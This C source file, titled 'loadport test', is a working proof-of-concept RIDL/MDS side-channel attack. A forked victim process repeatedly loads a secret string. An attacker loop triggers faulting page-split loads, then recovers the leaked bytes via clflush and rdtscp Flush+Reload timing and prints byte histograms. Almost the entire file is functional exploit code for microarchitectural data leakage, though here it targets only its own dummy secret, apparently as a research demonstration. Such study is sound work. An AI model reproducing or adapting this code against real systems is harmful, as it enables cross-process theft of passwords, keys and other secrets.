/*
    loadport test
*/
#define ITERS 1000

#define START 48
#define END 64

#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <malloc.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <ctype.h>
#include <linux/mman.h>
#include <sys/prctl.h>

#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB)

#ifndef PR_SET_SPECULATION_CTRL
#define PR_SET_SPECULATION_CTRL 53
#endif
#ifndef PR_SPEC_DISABLE
#define PR_SPEC_DISABLE 4
#endif

uint64_t rdtsc()
{
    uint64_t a, d;
    asm volatile("mfence");
#if USE_RDTSCP
    asm volatile("rdtscp"
                 : "=a"(a), "=d"(d)::"rcx");
#else
    asm volatile("rdtsc"
                 : "=a"(a), "=d"(d));
#endif
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

/* flush all lines of the reloadbuffer */
static inline void flush(unsigned char *reloadbuffer)
{
    for (size_t k = 0; k < 256; ++k)
    {
        size_t x = (k * 167) & (0xff);
        // size_t x = k;
        asm volatile("clflush (%0)\n\t" ::"r"(reloadbuffer + 1024 * x));
    }
}

static inline uint64_t rdtscp(void)
{
    uint64_t lo, hi;
    asm volatile("rdtscp\n\t"
                 : "=a"(lo), "=d"(hi)::"rcx");
    return (hi << 32) | lo;
}

uint64_t counter = 0, times = 0;

int main(void)
{
    prctl(PR_SET_SPECULATION_CTRL, 0, 8, 0, 0);

    pid_t pid = fork();
    if (pid == 0)
    {
        // victim thread: leak secret[i] by reading from offset i
        volatile char secret[32] = "ABCDEFGHIJKLMN\0";
        // volatile char secret[32] = "ATTACK  MIDWAY\0";
        // volatile char secret[32] = "XYZ\0";

        uint64_t i = 0x0;
        while (1)
        {
            asm volatile(
                /* move value into load port */
                // "movdqu (%0, %1), %%xmm0\n\t"
                "mov (%0, %1), %%rax\n\t"
                :
                : "r"(&secret), "r"(i)
                : "rax");
            i += 1;
            if (secret[i] == 0)
            {
                i = 0;
            }
        }
    }
    if (pid < 0)
    {
        return 1;
    }

    // attacker thread begin
    size_t results[256] = {0};
    unsigned char *reloadbuffer = (unsigned char *)mmap(NULL, 2 * 4096 * 256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0) + 80;
    unsigned char *leak = mmap(NULL, 4096 * 2, PROT_READ | PROT_WRITE, MMAP_FLAGS & ~MAP_HUGETLB, -1, 0);
    uint64_t start_timer = 0, cost_timer = 0, temp_timer;
    start_timer = rdtsc();
attack:

    for (size_t offset = START; offset < END; ++offset)
    {
        memset(results, 0, sizeof(results));

        for (size_t i = 0; i < ITERS; ++i)
        {
            counter++;
            temp_timer = rdtsc();
            /* cause a fault on either the first or the second page */
            int i = 1;
            madvise(leak + 4096 * i, 4096, MADV_DONTNEED);

            flush(reloadbuffer);
            asm volatile(
                "mfence\n\t"
                "movq (%0), %%rax\n\t"
                "andq $0xff, %%rax\n\t"
                "shl $0xa, %%rax\n\t"

                // ridl attack, leak data here
                // "prefetcht0 (%%rax, %1)\n\t"
                "movq 0x0(%%rax, %1, 0x1), %%rax\n\t"
                "mfence\n\t"
                :
                :
                /* start 4096 bytes before the end of the page; offsets>32 should cause a split */
                "r"(leak + 4096 - 64 + offset), "r"(reloadbuffer)
                : "rax");

            cost_timer += ((uint64_t)rdtsc() - temp_timer);
            // recover secret
            int success = 0;
            for (size_t k = 0; k < 256; ++k)
            {
                size_t x = (k * 167) & (0xff);
                // size_t x = k;
                unsigned char *p = reloadbuffer + (1024 * x);

                uint64_t t0 = rdtscp();
                *(volatile unsigned char *)p;
                uint64_t dt = rdtscp() - t0;
                if (dt < 160)
                {
                    results[x]++;
                    success = 1;
                }
            }

            if (success)
            {
                times++;
            }
        }

        int skip = 1;
        for (size_t c = 1; c < 256; ++c)
        {
            if (results[c] != 0)
            {
                skip = 0;
            }
        }
        if (skip)
        {
            continue;
        }
        printf("offset %d:\n", (int)offset);
        for (size_t c = 'A'; c <= 'Z'; ++c)
        {
            printf("  %c ", (char)c);
        }
        printf(" \n");
        for (size_t c = 'A'; c <= 'Z'; ++c)
        {
            printf("%3ld ", results[c]);
        }
        printf(" \n");
        for (size_t c = 1; c < 256; ++c)
        {
            if (results[c] >= ITERS / 100)
            {
                printf("%08zu: %02x (%c) \n", results[c], (unsigned int)c, isprint(c) ? (unsigned int)c : '?');
            }
        }
        printf("%ld %ld %.3lf\n", counter, times, (double)times * 100 / counter);
        printf("%ld\n", cost_timer);
    }

    // goto attack;
    kill(pid, SIGKILL);
}
